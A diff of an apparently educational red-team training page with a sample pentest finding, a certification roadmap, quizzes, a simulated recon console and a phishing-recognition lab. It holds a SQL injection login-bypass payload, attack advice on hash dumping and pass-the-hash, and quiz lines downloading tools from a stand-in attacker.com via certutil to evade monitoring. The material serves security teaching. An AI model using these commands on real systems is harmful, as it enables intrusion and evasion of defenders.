+          <rect x="490" y="10" width="200" height="195" rx="10" fill="rgba(34,197,94,.06)" stroke="rgba(34,197,94,.18)" stroke-width="1.5"/>
+          <text x="590" y="35" text-anchor="middle" fill="#22c55e" font-size="11" font-weight="600">Appendices</text>
+          <text x="590" y="52" text-anchor="middle" fill="#7a8fa8" font-size="9">Supporting material</text>
+          <text x="590" y="70" text-anchor="middle" fill="#4a3030" font-size="9">• Scope &amp; methodology</text>
+          <text x="590" y="86" text-anchor="middle" fill="#4a3030" font-size="9">• Tools used</text>
+          <text x="590" y="102" text-anchor="middle" fill="#4a3030" font-size="9">• Vulnerability count charts</text>
+          <text x="590" y="118" text-anchor="middle" fill="#4a3030" font-size="9">• Raw scan output</text>
+          <text x="590" y="134" text-anchor="middle" fill="#4a3030" font-size="9">• Timeline of activities</text>
+          <text x="590" y="150" text-anchor="middle" fill="#4a3030" font-size="9">• Attestation &amp; signatures</text>
+          <text x="590" y="190" text-anchor="middle" fill="#7a8fa8" font-size="8" font-style="italic">Reference material</text>
+        </svg>
+      </div>
+
+      <h3>CVSS Rating in Reports</h3>
+      <p>Every finding must be rated using CVSS so teams can prioritize remediation. Critical findings get fixed first. Here's how to communicate severity clearly:</p>
+      <pre><span class="c">## Finding: SQL Injection in Login Form</span>
+<span class="k">Severity: CRITICAL (CVSS 9.8)</span>
+<span class="c">CVE Reference: N/A (custom application)</span>
+<span class="c">Affected: https://corp-target.com/login.php</span>
+
+<span class="c">Description:</span>
+The login form is vulnerable to SQL injection. An unauthenticated
+attacker can bypass authentication and access all user accounts.
+
+<span class="c">Evidence:</span>
+[Screenshot showing admin login bypass]
+Payload used: <span class="k">admin' OR '1'='1'--</span>
+
+<span class="c">Business Impact:</span>
+An attacker can access all 50,000 user records, including credentials
+and payment information, leading to data breach and regulatory fines.
+
+<span class="c">Remediation:</span>
+1. Use parameterized queries / prepared statements
+2. Implement input validation and sanitization
+3. Deploy a Web Application Firewall (WAF)
+4. Apply principle of least privilege to database user</pre>
+    </div>
+
+
+    <!-- S20: CAREER PATH -->
+    <div class="lab-section" id="s20">
+      <div class="s-head"><span class="s-num">20</span><h2>Red Team Career Path</h2><span class="s-badge sb-green">Career</span></div>
+
+      <p>Red team roles are among the most sought-after (and highest-paid) in cybersecurity. Here's a realistic roadmap from beginner to senior offensive security professional.</p>
+
+      <div class="diagram-container">
+        <div class="diagram-title">Red Team Career Progression</div>
+        <svg width="100%" viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg">
+          <line x1="30" y1="80" x2="670" y2="80" stroke="#2a1010" stroke-width="3"/>
+          <circle cx="80" cy="80" r="12" fill="rgba(34,197,94,.2)" stroke="#22c55e" stroke-width="2"/>
+          <text x="80" y="85" text-anchor="middle" fill="#22c55e" font-size="10" font-weight="700">IT</text>
+          <text x="80" y="55" text-anchor="middle" fill="#dde6f0" font-size="10" font-weight="600">IT/Helpdesk</text>
+          <text x="80" y="67" text-anchor="middle" fill="#7a8fa8" font-size="9">0–2 years</text>
+          <text x="80" y="108" text-anchor="middle" fill="#4a3030" font-size="8">Network+</text>
+          <circle cx="230" cy="80" r="12" fill="rgba(245,158,11,.2)" stroke="#f59e0b" stroke-width="2"/>
+          <text x="230" y="85" text-anchor="middle" fill="#f59e0b" font-size="10" font-weight="700">Jr</text>
+          <text x="230" y="55" text-anchor="middle" fill="#dde6f0" font-size="10" font-weight="600">Jr Pentester</text>
+          <text x="230" y="67" text-anchor="middle" fill="#7a8fa8" font-size="9">2–4 years</text>
+          <text x="230" y="108" text-anchor="middle" fill="#4a3030" font-size="8">eJPT / Security+</text>
+          <circle cx="400" cy="80" r="12" fill="rgba(255,60,60,.2)" stroke="#ff3c3c" stroke-width="2"/>
+          <text x="400" y="85" text-anchor="middle" fill="#ff3c3c" font-size="10" font-weight="700">PT</text>
+          <text x="400" y="55" text-anchor="middle" fill="#dde6f0" font-size="10" font-weight="600">Pentester</text>
+          <text x="400" y="67" text-anchor="middle" fill="#7a8fa8" font-size="9">4–7 years</text>
+          <text x="400" y="108" text-anchor="middle" fill="#4a3030" font-size="8">OSCP / PNPT</text>
+          <circle cx="560" cy="80" r="12" fill="rgba(139,92,246,.2)" stroke="#8b5cf6" stroke-width="2"/>
+          <text x="560" y="85" text-anchor="middle" fill="#8b5cf6" font-size="10" font-weight="700">Sr</text>
+          <text x="560" y="55" text-anchor="middle" fill="#dde6f0" font-size="10" font-weight="600">Senior Red Teamer</text>
+          <text x="560" y="67" text-anchor="middle" fill="#7a8fa8" font-size="9">7+ years</text>
+          <text x="560" y="108" text-anchor="middle" fill="#4a3030" font-size="8">OSEP / CRTO / OSED</text>
+          <!-- Arrows -->
+          <line x1="92" y1="80" x2="215" y2="80" stroke="#2a1010" stroke-width="1.5"/>
+          <line x1="242" y1="80" x2="385" y2="80" stroke="#2a1010" stroke-width="1.5"/>
+          <line x1="412" y1="80" x2="545" y2="80" stroke="#2a1010" stroke-width="1.5"/>
+          <!-- Fork after Senior -->
+          <line x1="575" y1="70" x2="640" y2="40" stroke="#2a1010" stroke-width="1" stroke-dasharray="4,3"/>
+          <line x1="575" y1="90" x2="640" y2="120" stroke="#2a1010" stroke-width="1" stroke-dasharray="4,3"/>
+          <text x="648" y="44" fill="#8b5cf6" font-size="9">Red Team Lead</text>
+          <text x="648" y="124" fill="#ff3c3c" font-size="9">Bug Bounty Pro</text>
+        </svg>
+      </div>
+
+      <h3>Essential Certifications</h3>
+      <table>
+        <thead><tr><th>Level</th><th>Cert</th><th>What It Proves</th><th>Cost</th></tr></thead>
+        <tbody>
+          <tr><td>Beginner</td><td>eJPT (eLearnSecurity)</td><td>Basic pentesting methodology and tools</td><td>~$200</td></tr>
+          <tr><td>Beginner</td><td>CompTIA Security+</td><td>Security fundamentals foundation</td><td>~$390</td></tr>
+          <tr><td>Intermediate</td><td>PNPT (TCM Security)</td><td>Full pentest from recon to report — practical exam</td><td>~$400</td></tr>
+          <tr><td>Intermediate</td><td>CEH (EC-Council)</td><td>Ethical hacking concepts — widely recognized by HR</td><td>~$1,100</td></tr>
+          <tr><td>Advanced</td><td>OSCP (OffSec)</td><td>Gold standard — 24hr practical exam hacking 5 machines</td><td>~$1,500</td></tr>
+          <tr><td>Advanced</td><td>CRTO (Zero-Point Security)</td><td>Red Team Operator using Cobalt Strike — highly practical</td><td>~$500</td></tr>
+          <tr><td>Expert</td><td>OSEP / OSED (OffSec)</td><td>Advanced evasion / exploit development</td><td>~$1,500 each</td></tr>
+        </tbody>
+      </table>
+
+      <div class="success-box"><strong>🏆 Free Practice Platforms — Start Today:</strong><br>
+      <strong>TryHackMe</strong> — Best for beginners, guided rooms, free tier<br>
+      <strong>Hack The Box</strong> — Industry standard, medium difficulty, free machines<br>
+      <strong>VulnHub</strong> — Downloadable VMs, offline practice<br>
+      <strong>PortSwigger Web Academy</strong> — Best free web app pentesting training<br>
+      <strong>HackerOne / Bugcrowd</strong> — Real bug bounty programs, get paid for findings
+      </div>
+    </div>
+
+
+    <!-- REFERENCES -->
+    <div class="lab-section" id="refs">
+      <div class="s-head"><span class="s-num">📚</span><h2>Further Reading &amp; Resources</h2><span class="s-badge sb-green">References</span></div>
+      <a class="ref-card" href="https://tryhackme.com/path/outline/jrpenetrationtester" target="_blank">
+        <div class="ref-icon">🎯</div><div class="ref-body"><div class="ref-name">TryHackMe — Jr Penetration Tester Path</div><div class="ref-sub">Complete beginner-to-intermediate red team learning path. Free tier available. Best starting point.</div></div><div class="ref-arrow">→</div>
+      </a>
+      <a class="ref-card" href="https://academy.hackthebox.com/" target="_blank">
+        <div class="ref-icon">📦</div><div class="ref-body"><div class="ref-name">Hack The Box Academy</div><div class="ref-sub">Structured modules covering every pentesting topic. Industry-standard platform used by professionals worldwide.</div></div><div class="ref-arrow">→</div>
+      </a>
+      <a class="ref-card" href="https://portswigger.net/web-security" target="_blank">
+        <div class="ref-icon">🕷️</div><div class="ref-body"><div class="ref-name">PortSwigger Web Security Academy</div><div class="ref-sub">The definitive free resource for web application pentesting. Labs covering every OWASP Top 10 vulnerability.</div></div><div class="ref-arrow">→</div>
+      </a>
+      <a class="ref-card" href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">
+        <div class="ref-icon">⚡</div><div class="ref-body"><div class="ref-name">PayloadsAllTheThings — GitHub</div><div class="ref-sub">The ultimate collection of payloads, bypass techniques, and cheatsheets for web app and network pentesting.</div></div><div class="ref-arrow">→</div>
+      </a>
+    </div>
+
+
+    <!-- S21: FINAL VIVA -->
+    <div class="viva-section" id="s21">
+      <div style="text-align:center;margin-bottom:20px;">
+        <div style="font-family:'Orbitron',sans-serif;font-size:1.2rem;font-weight:700;color:var(--accent);margin-bottom:6px;">🎓 Final Viva Assessment</div>
+        <div style="font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);">Complete all sections · 10 questions · 5 minutes · 75% to pass · +250 XP</div>
+      </div>
+
+      <div id="vivaLocked" class="viva-locked-overlay">
+        <div class="lock-icon">🔒</div>
+        <div class="lock-msg">Scroll through all 20 sections to unlock this assessment.<br>The viva unlocks at 90% page progress.</div>
+      </div>
+
+      <div class="viva-timer" id="vivaTimer" style="display:none;">05:00</div>
+
+      <form id="quizForm" style="display:none;">
+        <div class="quiz-q"><p>1. What document must be signed before a penetration test begins that defines exactly what systems can be tested?</p>
+          <label><input type="radio" name="q1" value="0"> Non-Disclosure Agreement (NDA)</label>
+          <label><input type="radio" name="q1" value="1"> Rules of Engagement (ROE)</label>
+          <label><input type="radio" name="q1" value="0"> Service Level Agreement (SLA)</label>
+          <label><input type="radio" name="q1" value="0"> No document needed for authorized tests</label>
+        </div>
+        <div class="quiz-q"><p>2. A pentester finds Apache 2.4.49 running on a web server. What is the immediate next step?</p>
+          <label><input type="radio" name="q2" value="0"> Shut down the server for safety</label>
+          <label><input type="radio" name="q2" value="0"> Report it immediately without further testing</label>
+          <label><input type="radio" name="q2" value="1"> Search for known CVEs for Apache 2.4.49 (e.g., path traversal CVE-2021-41773)</label>
+          <label><input type="radio" name="q2" value="0"> Upgrade Apache immediately</label>
+        </div>
+        <div class="quiz-q"><p>3. What is a "reverse shell" and why is it preferred over a bind shell?</p>
+          <label><input type="radio" name="q3" value="0"> Target listens for connection — preferred because it's faster</label>
+          <label><input type="radio" name="q3" value="1"> Target connects back to attacker — preferred because it bypasses firewall rules that block inbound connections</label>
+          <label><input type="radio" name="q3" value="0"> Attacker hacks the target's shell prompt directly</label>
+          <label><input type="radio" name="q3" value="0"> A shell that automatically reverses all damage done</label>
+        </div>
+        <div class="quiz-q"><p>4. Which command discovers SUID binaries on a Linux system for privilege escalation?</p>
+          <label><input type="radio" name="q4" value="0"> <code>ls -la /root</code></label>
+          <label><input type="radio" name="q4" value="0"> <code>sudo check --suid</code></label>
+          <label><input type="radio" name="q4" value="1"> <code>find / -perm -4000 -type f 2>/dev/null</code></label>
+          <label><input type="radio" name="q4" value="0"> <code>ps aux | grep root</code></label>
+        </div>
+        <div class="quiz-q"><p>5. What does Mimikatz primarily do in post-exploitation?</p>
+          <label><input type="radio" name="q5" value="0"> Scans for open ports on the network</label>
+          <label><input type="radio" name="q5" value="1"> Extracts plaintext passwords and hashes from Windows memory (LSASS)</label>
+          <label><input type="radio" name="q5" value="0"> Creates a web shell on the target</label>
+          <label><input type="radio" name="q5" value="0"> Escalates privileges using kernel exploits</label>
+        </div>
+        <div class="quiz-q"><p>6. A C2 framework's "agent/beacon" on a victim machine checks in every 60 seconds. This regular, timed communication is called:</p>
+          <label><input type="radio" name="q6" value="0"> Heartbeat monitoring</label>
+          <label><input type="radio" name="q6" value="0"> Polling</label>
+          <label><input type="radio" name="q6" value="1"> Beaconing — a key indicator of compromise (IoC)</label>
+          <label><input type="radio" name="q6" value="0"> Network keepalive</label>
+        </div>
+        <div class="quiz-q"><p>7. "Living Off the Land" (LOLBins) means:</p>
+          <label><input type="radio" name="q7" value="0"> Conducting pentests in rural areas with poor connectivity</label>
+          <label><input type="radio" name="q7" value="1"> Using built-in OS tools (certutil, PowerShell, mshta) as attack tools to avoid introducing malware</label>
+          <label><input type="radio" name="q7" value="0"> Surviving in a lab environment without internet access</label>
+          <label><input type="radio" name="q7" value="0"> Using only open-source tools in an engagement</label>
+        </div>
+        <div class="quiz-q"><p>8. What is the difference between phishing and spearphishing?</p>
+          <label><input type="radio" name="q8" value="0"> Spearphishing uses phone calls; phishing uses email</label>
+          <label><input type="radio" name="q8" value="0"> They are the same thing with different names</label>
+          <label><input type="radio" name="q8" value="1"> Phishing is mass/generic; spearphishing is highly targeted at a specific individual using personal OSINT</label>
+          <label><input type="radio" name="q8" value="0"> Spearphishing only targets executives (CEO, CFO)</label>
+        </div>
+        <div class="quiz-q"><p>9. What is BloodHound used for in a penetration test?</p>
+          <label><input type="radio" name="q9" value="0"> Scanning for SQL injection vulnerabilities in web applications</label>
+          <label><input type="radio" name="q9" value="0"> Brute forcing passwords against remote services</label>
+          <label><input type="radio" name="q9" value="1"> Mapping Active Directory relationships and automatically finding attack paths to Domain Admin</label>
+          <label><input type="radio" name="q9" value="0"> Generating phishing emails and tracking which users clicked</label>
+        </div>
+        <div class="quiz-q"><p>10. A pentest report's Executive Summary should be:</p>
+          <label><input type="radio" name="q10" value="0"> Filled with technical details, CVE numbers, and exploit code</label>
+          <label><input type="radio" name="q10" value="0"> Only written if critical vulnerabilities were found</label>
+          <label><input type="radio" name="q10" value="1"> Written in plain business language for management — explaining business risk and recommended actions, not technical details</label>
+          <label><input type="radio" name="q10" value="0"> A copy of all Nmap and Metasploit output</label>
+        </div>
+
+        <button type="button" class="submit-quiz" onclick="submitViva()">⚔️ Submit Assessment</button>
+      </form>
+
+      <div class="quiz-result" id="quizResult">
+        <div class="qr-score" id="qrScore"></div>
+        <div class="qr-msg" id="qrMsg"></div>
+      </div>
+    </div>
+
+
+    <!-- COMPLETE -->
+    <div class="complete-wrap">
+      <button class="complete-btn" id="completeBtn" onclick="completeCourse()">⚔️ Mark Module Complete — Earn 250 XP</button>
+    </div>
+
+  </div><!-- /content -->
+
+  <footer>HackForge · Red Team Module · <a href="index.html">Home</a> · <a href="blue-team.html">Blue Team</a> · <a href="roadmap.html">Roadmap</a></footer>
+</main>
+
+
+<script>
+/* ═══ READ PROGRESS & TOC ════════════════════════════ */
+const sections = document.querySelectorAll('[id^="s"]');
+const tocLinks = document.querySelectorAll('.toc-link');
+let vivaUnlocked = false;
+
+window.addEventListener('scroll', () => {
+  const total = document.body.scrollHeight - window.innerHeight;
+  const pct = Math.min(window.scrollY / total, 1);
+  document.getElementById('readIndicator').style.transform = `scaleX(${pct})`;
+  const roundPct = Math.round(pct * 100);
+  document.getElementById('pillFill').style.width = roundPct + '%';
+  document.getElementById('pillPct').textContent = roundPct + '%';
+  document.getElementById('lpbFill').style.width = roundPct + '%';
+  document.getElementById('lpbPct').textContent = roundPct + '%';
+  if (pct > 0.9 && !vivaUnlocked) { vivaUnlocked = true; unlockViva(); }
+  let current = '';
+  sections.forEach(sec => { if (window.scrollY >= sec.offsetTop - 120) current = sec.id; });
+  tocLinks.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + current));
+});
+
+/* ═══ TAB SYSTEM ════════════════════════════════════ */
+function showTab(id) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  event.target.classList.add('active');
+}
+
+/* ═══ RECON SIMULATOR ════════════════════════════════ */
+const reconScenarios = {
+  nmap_basic: (t) => [
+    `<span class="ro-cmd">$ nmap ${t}</span>`,
+    `<span class="ro-info">Starting Nmap 7.94 ( https://nmap.org )</span>`,
+    `<span class="ro-info">Nmap scan report for ${t} (203.0.113.42)</span>`,
+    `<span class="ro-ok">PORT    STATE  SERVICE</span>`,
+    `<span class="ro-warn">22/tcp  open   ssh</span>`,
+    `<span class="ro-warn">80/tcp  open   http</span>`,
+    `<span class="ro-vuln">443/tcp open   https</span>`,
+    `<span class="ro-warn">8080/tcp open  http-proxy</span>`,
+    `<span class="ro-vuln">3306/tcp open  mysql  ← Database exposed!</span>`,
+    `<span class="ro-ok">Nmap done: 1 IP address scanned in 4.23 seconds</span>`
+  ],
+  nmap_svc: (t) => [
+    `<span class="ro-cmd">$ nmap -sV -sC ${t}</span>`,
+    `<span class="ro-warn">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span>`,
+    `<span class="ro-warn">80/tcp   open  http    Apache httpd 2.4.49</span>`,
+    `<span class="ro-vuln">|_ HTTP/1.1 200 OK</span>`,
+    `<span class="ro-vuln">443/tcp  open  https   Apache httpd 2.4.49  ← CVE-2021-41773!</span>`,
+    `<span class="ro-vuln">3306/tcp open  mysql   MySQL 5.7.38</span>`,
+    `<span class="ro-warn">|_mysql-info: Root account accessible with empty password!</span>`,
+    `<span class="ro-vuln">8080/tcp open  http    Apache Tomcat 8.5.0  ← CVE-2019-0232</span>`,
+    `<span class="ro-ok">Service detection performed.</span>`,
+    `<span class="ro-info">💡 Analyst: 3 HIGH/CRITICAL CVEs identified from version scan!</span>`
+  ],
+  gobuster: (t) => [
+    `<span class="ro-cmd">$ gobuster dir -u http://${t} -w /usr/share/wordlists/dirb/common.txt</span>`,
+    `<span class="ro-info">Gobuster v3.6 — Brute Force Mode — Status codes: 200,204,301,302,307,403</span>`,
+    `<span class="ro-ok">/index.html           (Status: 200) [Size: 12430]</span>`,
+    `<span class="ro-ok">/about.html           (Status: 200) [Size: 4821]</span>`,
+    `<span class="ro-warn">/admin                (Status: 301) [→ /admin/]  ← Interesting!</span>`,
+    `<span class="ro-vuln">/backup               (Status: 200) [Size: 52840]  ← Backup directory!</span>`,
+    `<span class="ro-vuln">/config.php           (Status: 200) [Size: 203]    ← Config file exposed!</span>`,
+    `<span class="ro-warn">/uploads              (Status: 301) [→ /uploads/] ← File upload?</span>`,
+    `<span class="ro-vuln">/.git                 (Status: 301) [→ /.git/]    ← Source code leaked!</span>`,
+    `<span class="ro-info">💡 Found: admin panel, backup files, exposed config, git repo!</span>`
+  ],
+  whois: (t) => [
+    `<span class="ro-cmd">$ whois ${t}</span>`,
+    `<span class="ro-info">Domain Name: ${t.toUpperCase()}</span>`,
+    `<span class="ro-ok">Registrar: GoDaddy.com, LLC</span>`,
+    `<span class="ro-warn">Registrant Organization: Corp Target Incorporated</span>`,
+    `<span class="ro-warn">Registrant Email: it-admin@${t}</span>`,
+    `<span class="ro-ok">Created: 2015-03-14</span>`,
+    `<span class="ro-ok">Updated: 2024-11-20</span>`,
+    `<span class="ro-ok">Expires: 2026-03-14</span>`,
+    `<span class="ro-warn">Name Servers: ns1.corp-target.com, ns2.corp-target.com</span>`,
+    `<span class="ro-info">💡 Email found: it-admin@${t} — useful for spearphishing or credential spray!</span>`
+  ],
+  theHarvester: (t) => [
+    `<span class="ro-cmd">$ theHarvester -d ${t} -b all</span>`,
+    `<span class="ro-info">theHarvester v4.4.0 — Recon Tool</span>`,
+    `<span class="ro-warn">Emails found:</span>`,
+    `<span class="ro-ok">  j.smith@${t}</span>`,
+    `<span class="ro-ok">  sarah.jones@${t}</span>`,
+    `<span class="ro-ok">  it-helpdesk@${t}</span>`,
+    `<span class="ro-warn">Subdomains found:</span>`,
+    `<span class="ro-vuln">  vpn.${t}</span>`,
+    `<span class="ro-ok">  mail.${t}</span>`,
+    `<span class="ro-vuln">  dev.${t}  ← Development server?</span>`,
+    `<span class="ro-ok">  www.${t}</span>`,
+    `<span class="ro-info">💡 Found 3 email addresses + 4 subdomains. VPN &amp; dev servers are high-value targets!</span>`
+  ],
+  shodan: (t) => [
+    `<span class="ro-cmd">$ shodan search hostname:${t}</span>`,
+    `<span class="ro-info">Shodan — The Search Engine for the Internet of Things</span>`,
+    `<span class="ro-warn">IP: 203.0.113.42 | Port: 22, 80, 443, 8080, 3306</span>`,
+    `<span class="ro-vuln">  Banner: Apache/2.4.49 (Unix) — VULNERABLE (CVE-2021-41773)</span>`,
+    `<span class="ro-warn">IP: 203.0.113.55 | Port: 21, 22, 3389</span>`,
+    `<span class="ro-ok">  Banner: Microsoft FTP Service 10.0</span>`,
+    `<span class="ro-vuln">IP: 203.0.113.88 | Port: 27017 (MongoDB)</span>`,
+    `<span class="ro-vuln">  MongoDB — NO AUTHENTICATION REQUIRED  ← Critical!</span>`,
+    `<span class="ro-ok">IP: 203.0.113.100 | Port: 80, 443 (Nginx 1.18)</span>`,
+    `<span class="ro-info">💡 Shodan found an exposed MongoDB database with no auth! That's a data breach waiting to happen.</span>`
+  ],
+  nikto: (t) => [
+    `<span class="ro-cmd">$ nikto -h http://${t}</span>`,
+    `<span class="ro-info">Nikto v2.1.6 — Web Server Scanner</span>`,
+    `<span class="ro-warn">Server: Apache/2.4.49 (Unix)</span>`,
+    `<span class="ro-vuln">OSVDB-3092: /admin/: Admin login page found</span>`,
+    `<span class="ro-vuln">OSVDB-3268: /backup/: Backup folder accessible</span>`,
+    `<span class="ro-warn">X-Frame-Options: Not set — Clickjacking possible</span>`,
+    `<span class="ro-vuln">OSVDB-3233: /phpinfo.php: PHP info disclosure!</span>`,
+    `<span class="ro-ok">Cookie Set Without HttpOnly Flag</span>`,
+    `<span class="ro-vuln">Apache 2.4.49 path traversal: CVE-2021-41773</span>`,
+    `<span class="ro-info">7 items reported on remote host. Scan complete in 45 seconds.</span>`
+  ],
+  enum4linux: (t) => [
+    `<span class="ro-cmd">$ enum4linux -a ${t}</span>`,
+    `<span class="ro-info">Enum4Linux v0.9.1 — SMB Enumeration for Windows/Samba</span>`,
+    `<span class="ro-warn">[+] Null session established on ${t}</span>`,
+    `<span class="ro-vuln">[+] OS: Windows Server 2012 R2 — Build 9200</span>`,
+    `<span class="ro-warn">[+] Users via RPC:</span>`,
+    `<span class="ro-ok">  Administrator, Guest, krbtgt</span>`,
+    `<span class="ro-ok">  john.doe, sarah.jones, it.admin</span>`,
+    `<span class="ro-warn">[+] Share Enumeration:</span>`,
+    `<span class="ro-vuln">  ADMIN$  — Remote Admin (accessible!)</span>`,
+    `<span class="ro-ok">  C$      — Default Share (access denied)</span>`,
+    `<span class="ro-vuln">  backup  — READABLE by Everyone!  ← Data leak!</span>`,
+    `<span class="ro-info">💡 Found user list + readable backup share. Username list enables password spraying!</span>`
+  ]
+};
+
+function runRecon() {
+  const type = document.getElementById('reconType').value;
+  const target = document.getElementById('reconTarget').value || 'corp-target.com';
+  const out = document.getElementById('reconOutput');
+  out.innerHTML = '';
+  const lines = reconScenarios[type](target);
+  lines.forEach((line, i) => {
+    const span = document.createElement('span');
+    span.className = 'ro-line';
+    span.innerHTML = line;
+    span.style.animationDelay = (i * 0.1) + 's';
+    out.appendChild(span);
+  });
+}
+
+/* ═══ EXPLOIT QUIZ ═══════════════════════════════════ */
+const eqQuestions = [
+  { q: "During a pentest you discover MySQL port 3306 is exposed externally on the target server. What's your FIRST move?",
+    opts: ["Immediately exploit it with SQLmap", "Try default credentials (root with no password)", "Ignore it — databases are not in scope", "Document the open port and check if it's in scope, then try default creds"],
+    correct: 3, exp: "✅ Always verify scope first, then try default credentials (root:root, root:password, root:[blank]). Many databases are accidentally exposed with default configs." },
+  { q: "You gain a low-privilege shell on a Linux web server as 'www-data'. Type: uname -a reveals kernel 4.4.0-21. What do you do?",
+    opts: ["Give up — www-data has very limited access", "Run linPEAS to auto-enumerate PrivEsc vectors, then search for kernel 4.4.0-21 exploits", "Immediately delete system files to cover tracks", "Report to client without attempting PrivEsc"],
+    correct: 1, exp: "✅ Run LinPEAS first — it automatically checks everything. Also search for the specific kernel version in ExploitDB. Kernel 4.4.0-21 has several local privilege escalation vulnerabilities." },
+  { q: "You've compromised a Windows machine and run 'net localgroup administrators'. The output shows the user 'corp\\svc_backup' is a local admin. What technique does this enable?",
+    opts: ["Nothing — service accounts can't be exploited", "Lateral movement to other machines where svc_backup has access using Pass-the-Hash or its credentials", "Only useful for persistence via scheduled tasks", "Shut down backup services to disrupt recovery"],
+    correct: 1, exp: "✅ Service accounts often have access to multiple machines! Dump svc_backup's hash with Mimikatz/hashdump, then use Pass-the-Hash or crackmapexec to move laterally to servers where this account has admin rights." },
+  { q: "A client's SOC is monitoring for suspicious PowerShell activity. You need to download your tool to the target. Which LOLBin technique evades PowerShell monitoring?",
+    opts: ["powershell -c Invoke-WebRequest -Uri http://attacker.com/tool.exe", "certutil -urlcache -split -f http://attacker.com/tool.exe tool.exe", "wget http://attacker.com/tool.exe", "curl http://attacker.com/tool.exe"],
+    correct: 1, exp: "✅ certutil.exe is a legitimate Windows Certificate management tool that can download files. Since it's not PowerShell, it bypasses PowerShell-specific monitoring. wget/curl aren't available by default on Windows." },
+  { q: "After the engagement, you notice you forgot to remove a scheduled task you created for persistence testing. What do you do?",
+    opts: ["Leave it — it's probably harmless", "Delete it immediately and document it in the report's cleanup section", "Tell the client verbally but don't include it in the report", "Disable it but don't delete it"],
+    correct: 1, exp: "✅ Remove it IMMEDIATELY. ALL persistence mechanisms must be removed before the engagement ends. Document exactly what you created and deleted in the report. Leaving backdoors is a professional and legal liability." }
+];
+let eqIdx = 0, eqScore = 0, eqAnswered = false;
+function loadEQ() {
+  const q = eqQuestions[eqIdx];
+  document.getElementById('eqQ').textContent = `Scenario ${eqIdx+1}/5: ${q.q}`;
+  document.getElementById('eqExp').style.display = 'none';
+  document.getElementById('eqNext').style.display = 'none';
+  eqAnswered = false;
+  const opts = document.getElementById('eqOpts');
+  opts.innerHTML = '';
+  q.opts.forEach((opt, i) => {
+    const d = document.createElement('div');
+    d.className = 'eq-opt';
+    d.innerHTML = `<span style="font-family:JetBrains Mono,monospace;font-size:.7rem;color:var(--muted)">${String.fromCharCode(65+i)}.</span>${opt}`;
+    d.onclick = () => answerEQ(i);
+    opts.appendChild(d);
+  });
+}
+function answerEQ(chosen) {
+  if (eqAnswered) return;
+  eqAnswered = true;
+  const q = eqQuestions[eqIdx];
+  document.querySelectorAll('.eq-opt').forEach((el, i) => {
+    if (i === q.correct) el.classList.add('correct');
+    else if (i === chosen && chosen !== q.correct) el.classList.add('wrong');
+    el.style.pointerEvents = 'none';
+  });
+  if (chosen === q.correct) { eqScore++; document.getElementById('eqScore').textContent = eqScore; }
+  const exp = document.getElementById('eqExp');
+  exp.textContent = q.exp;
+  exp.style.display = 'block';
+  if (eqIdx < eqQuestions.length - 1) document.getElementById('eqNext').style.display = 'inline-block';
+  else {
+    exp.textContent += ` | Final score: ${eqScore}/5`;
+    document.getElementById('eqScore').textContent = eqScore + '/5';
+  }
+}
+function nextEQ() { eqIdx++; loadEQ(); }
+loadEQ();
+
+/* ═══ PHISHING LAB ═══════════════════════════════════ */
+const phishEmails = [
+  { from: 'security@microsoft-alert.com', to: 'you@company.com', subj: 'URGENT: Your Microsoft Account Has Been Compromised', body: `Dear Customer,\n\nWe have detected unauthorized access to your Microsoft account from an unrecognized device in Moscow, Russia.\n\nTo secure your account, you MUST verify your identity within 2 hours or your account will be permanently suspended.\n\n→ Click here to verify: http://microsofft-security.net/verify\n\nMicrosoft Security Team`, redFlags: ['Sender domain: microsoft-alert.com (not microsoft.com)', 'Link domain: microsofft-security.net (typosquatted)', 'Creates urgency (2 hours, permanent suspension)', 'Generic greeting "Dear Customer" — real Microsoft uses your name', 'No case/ticket number for a security incident', 'Russian location — fear tactic'] },
+  { from: 'hr@company-corp.internal', to: 'all-staff@company.com', subj: 'Salary Review 2025 — Action Required', body: `Hi Team,\n\nAs discussed in last week's all-hands, HR has completed the annual salary review process.\n\nAll employees must confirm their bank account details for the updated payroll to take effect from next month.\n\n→ Login to confirm: https://company-corp-hr.azurewebsites.net/salary-update\n\nPlease complete this by EOD Friday.\n\nThanks,\nHR Team`, redFlags: ['Sender says "internal" but came from outside the org', 'Asking to confirm bank details via email — HR NEVER does this', 'Link goes to azurewebsites.net, not company domain', 'Friday deadline creates pressure to act without thinking', 'Vague reference to "last week\'s all-hands" for false familiarity', 'No phone number or direct contact to verify'] },
+  { from: 'john.smith@corp-partner.com', to: 'cfo@company.com', subj: 'Urgent Wire Transfer Request - Confidential', body: `Hi,\n\nI'm traveling in Singapore for the acquisition deal and have run into a problem. I need you to process an urgent wire transfer of $87,500 to our legal firm's escrow account before the markets close.\n\nThis is time-sensitive and strictly confidential — please don't discuss with anyone else as it's part of our NDA.\n\nAccount Details:\nBank: DBS Bank Singapore\nAccount: 123-456789-0\nRef: ACQ-2025-SG\n\nI'll explain everything when I back. Process ASAP please.\n\nJohn\nCEO`, redFlags: ['Classic BEC (Business Email Compromise) attack', 'Impersonating the CEO via email (check actual From: address)', 'Unusual email domain (corp-partner.com vs company.com)', 'Urgency + secrecy = major red flags ("don\'t discuss with anyone")', 'Wire transfers are irreversible — favorite method for fraud', 'CEO traveling + can\'t be contacted — plausible excuse', 'Always call the CEO directly on known number to verify LARGE transfers'] }
+];
+let phishIdx = 0;
+function showPhish(idx) {
+  phishIdx = idx;
+  document.querySelectorAll('#phishTabs .tab-btn').forEach((b, i) => b.classList.toggle('active', i === idx));
+  renderPhish();
+}
+function renderPhish() {
+  const e = phishEmails[phishIdx];
+  let revealed = false;
+  document.getElementById('phishContent').innerHTML = `
+    <div style="background:#060101;border:1px solid var(--border-dim);border-radius:10px;overflow:hidden;">
+      <div style="padding:14px 18px;border-bottom:1px solid var(--border-dim);">
+        <div style="font-family:JetBrains Mono,monospace;font-size:.8rem;margin-bottom:6px;"><span style="color:var(--muted)">From: </span><span style="color:var(--warning)">${e.from}</span></div>
+        <div style="font-family:JetBrains Mono,monospace;font-size:.8rem;margin-bottom:6px;"><span style="color:var(--muted)">To: </span><span style="color:var(--text)">${e.to}</span></div>
